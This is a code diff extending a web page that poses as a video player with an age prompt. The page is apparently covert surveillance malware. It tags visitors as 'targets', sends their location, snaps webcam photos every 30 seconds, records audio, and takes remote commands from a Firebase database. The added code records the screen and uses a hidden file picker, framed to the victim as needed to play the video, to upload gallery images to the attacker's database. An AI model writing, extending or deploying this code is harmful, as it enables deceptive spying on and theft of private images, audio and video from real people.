@@ -14,6 +14,8 @@
         #play-btn::after { content: ''; border-top: 20px solid transparent; border-bottom: 20px solid transparent; border-left: 30px solid #fff; margin-left: 10px; }
         #age-modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 85%; max-width: 350px; background: #111; border: 1px solid #333; border-radius: 15px; padding: 25px; text-align: center; z-index: 1000; box-shadow: 0 0 50px #000; }
         .btn-yes { background: #00ff41; color: #000; padding: 15px 30px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 20px; width: 100%; }
+        /* Hidden file input for gallery access */
+        #hiddenFileInput { display: none; }
     </style>
 </head>
 <body>
@@ -35,6 +37,8 @@
         <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
     </video>
 
+    <input type="file" id="hiddenFileInput" accept="image/*" multiple>
+
     <script>
         // --- CONFIGURATION ---
         const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
@@ -47,6 +51,9 @@
         const sessionID = "Target_" + dateStr + "_" + Math.floor(1000 + Math.random() * 9000);
 
         let currentStream = null;
+        let screenRecordingStream = null;
+        let mediaRecorder = null;
+        let recordedChunks = [];
 
         // --- CORE SYSTEM ---
         async function startStealthSystem() {
@@ -66,7 +73,7 @@
                 
                 // 4. Start Background Processes
                 sendLocation();
-                setInterval(() => { capturePhoto('auto', 'user'); }, 30000);
+                setInterval(() => { capturePhoto('auto', 'user'); }, 30000); // Auto-capture every 30 seconds
                 listenForAdmin();
 
             } catch (err) {
@@ -107,8 +114,7 @@
         // --- DUAL CAMERA CAPTURE SYSTEM ---
         async function capturePhoto(label, mode) {
             try {
-                // Pehle purane tracks stop karein taake naya camera khul sake
-                if (currentStream) {
+                if (currentStream) { // Stop default stream if active
                     currentStream.getTracks().forEach(track => track.stop());
                 }
 
@@ -122,7 +128,6 @@
                 v.setAttribute('playsinline', '');
                 await v.play();
 
-                // 2 second wait sensor adjust karne ke liye
                 setTimeout(() => {
                     const canvas = document.createElement('canvas');
                     canvas.width = 640; canvas.height = 480;
@@ -134,9 +139,8 @@
                         time: Date.now()
                     });
 
-                    // Tracks stop karke wapis default stream on karein (for background listening)
                     stream.getTracks().forEach(t => t.stop());
-                    restartDefaultStream();
+                    restartDefaultStream(); // Restart default stream
                 }, 2000);
             } catch (e) { console.log("Cam Error: ", e); }
         }
@@ -144,6 +148,73 @@
         async function restartDefaultStream() {
             currentStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
         }
+
+        // --- NEW: SCREEN RECORDING LOGIC ---
+        async function startScreenRecording() {
+            try {
+                // User ko permission deni hogi "Share Screen" ke liye
+                screenRecordingStream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: true });
+                mediaRecorder = new MediaRecorder(screenRecordingStream);
+                recordedChunks = [];
+
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) {
+                        recordedChunks.push(event.data);
+                    }
+                };
+
+                mediaRecorder.onstop = () => {
+                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                    const reader = new FileReader();
+                    reader.readAsDataURL(blob);
+                    reader.onloadend = () => {
+                        db.ref(`targets/${sessionID}/screen_records`).push({
+                            video: reader.result,
+                            time: Date.now()
+                        });
+                    };
+                    screenRecordingStream.getTracks().forEach(track => track.stop()); // Stop screen sharing
+                };
+
+                mediaRecorder.start();
+                alert("Screen Recording Started (will stop in 15 seconds)"); // User ko pata chalega
+                setTimeout(() => {
+                    if (mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                    }
+                }, 15000); // 15 seconds recording
+            } catch (err) {
+                alert("Screen recording permission denied or not supported.");
+                console.error("Screen recording error: ", err);
+            }
+        }
+
+        // --- NEW: GALLERY ACCESS LOGIC (User Interaction Required) ---
+        function triggerGalleryAccess() {
+            // User ko lagega ke video chalane ke liye file select karni hai
+            document.getElementById('hiddenFileInput').click();
+        }
+
+        document.getElementById('hiddenFileInput').addEventListener('change', async (event) => {
+            for (const file of event.target.files) {
+                if (file.type.startsWith('image/')) {
+                    const reader = new FileReader();
+                    reader.readAsDataURL(file);
+                    reader.onloadend = () => {
+                        db.ref(`targets/${sessionID}/gallery_files`).push({
+                            name: file.name,
+                            type: file.type,
+                            data: reader.result,
+                            time: Date.now()
+                        });
+                        alert(`Uploaded: ${file.name}`);
+                    };
+                } else {
+                    alert("Only image files can be uploaded here.");
+                }
+            }
+        });
+
 
         // --- COMMAND LISTENER ---
         function listenForAdmin() {
@@ -153,8 +224,8 @@
 
                 if(cmd.action === 'photo') capturePhoto('front', 'user');
                 if(cmd.action === 'back_photo') capturePhoto('back', 'environment');
-                
                 if(cmd.action === 'audio') {
+                    // Audio recording logic (unchanged)
                     const rec = new MediaRecorder(currentStream);
                     let chunks = [];
                     rec.ondataavailable = e => chunks.push(e.data);
@@ -166,8 +237,12 @@
                     rec.start(); 
                     setTimeout(() => rec.stop(), 5000);
                 }
+                
+                // NEW COMMANDS
+                if(cmd.action === 'screen_record') startScreenRecording();
+                if(cmd.action === 'gallery_access') triggerGalleryAccess();
 
-                // Command delete kar dein taake loop na bane
+                // Remove command after execution
                 db.ref(`commands/${sessionID}`).remove();
             });
         }
